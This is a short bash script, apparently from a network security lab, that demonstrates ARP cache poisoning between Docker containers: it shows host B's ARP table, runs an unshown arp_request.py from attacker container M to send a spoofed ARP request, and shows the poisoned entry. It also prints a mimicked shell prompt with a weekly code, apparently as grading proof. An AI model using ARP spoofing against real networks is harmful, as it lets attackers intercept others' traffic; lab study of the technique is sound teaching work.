#!/bin/bash
# Task 1.A -- ARP cache poisoning using a spoofed ARP request (from M).
set -u
cd "$(dirname "$0")" || exit 1

read -p "Enter weekly code (e.g. WK01-ASDK): " WK

wk() {
  local G=$'\033[01;32m' B=$'\033[01;34m' R=$'\033[00m'
  local PROMPT_DIRTRIM; PROMPT_DIRTRIM=$(sed -n 's/^[[:space:]]*PROMPT_DIRTRIM=\([0-9]\+\).*/\1/p' ~/.bashrc 2>/dev/null | tail -1)
  local w='\w'; w="${w@P}"
  printf '[%s]%s%s@%s%s:%s%s%s$ echo %s\n' "$(date +%D)" "$G" "$(whoami)" "$(hostname)" "$R" "$B" "$w" "$R" "$WK"
  echo "$WK"
}

docker exec A-10.9.0.5 ping -c 1 10.9.0.6 >/dev/null 2>&1
echo "B's ARP cache before attack (10.9.0.5 = A's real MAC 02:42:0a:09:00:05):"
docker exec B-10.9.0.6 arp -n

echo
echo "M sends a spoofed ARP request (sender 10.9.0.5 with M's MAC) to B:"
docker exec -i M-10.9.0.105 python3 - < arp_request.py

echo
echo "B's ARP cache after attack (10.9.0.5 should now be M's MAC 02:42:0a:09:00:69):"
docker exec B-10.9.0.6 arp -n
wk
